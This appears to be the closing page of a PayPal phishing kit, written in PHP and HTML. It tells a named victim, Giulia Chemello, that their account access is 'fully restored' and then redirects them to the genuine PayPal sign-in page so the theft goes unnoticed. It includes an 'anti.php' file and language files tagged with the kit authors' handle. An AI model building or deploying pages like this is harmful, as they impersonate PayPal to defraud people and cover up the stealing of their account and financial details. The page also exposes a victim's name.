<?php

include('./anti.php');
include('./inc/lange.php');
include "./inc/lange".$_SESSION['Moustache-ANONISMA-AYOUB'];



?>
<!DOCTYPE html>
<html>
<head> 
    <meta charset="utf-8" />
    <meta name="viewport" content="initial-scale=1.0">
    <meta HTTP-EQUIV='Refresh' Content=2;URL='https://www.paypal.com/signin'>
	<title>Thanx You</title>
  <link rel="shortcut icon" link rel="logo-icon" href="./img/icon.ico">
	<link rel="stylesheet" type="text/css" href="css/billing.css">
</head>
<body>


<?php

include 'fils/nav.php';

?>



  <div class="lwalida">
  	<header>
  		<img src="img/thx.png">
  	</header>
  	<div class="casablanca">
  		<h2>Your Account Access is Fully Restored Giulia Chemello</h2>
  		<p id="te">Thanx you for taking the steps to restore your account access , Your patience and efforts increass, and financial date as seriously as you do, and these ongoing checks of our system contribute to our hight level of security. your account will be verified in the next 24 hours</p>
  		<button><a href="https://www.paypal.com">My PayPal</a></button>
  		<p>You are being redirected to your PayPal account , within 5 second</p>
  	</div>
  </div>



<?php

include 'fils/footer.php';

?>


</body>
</html>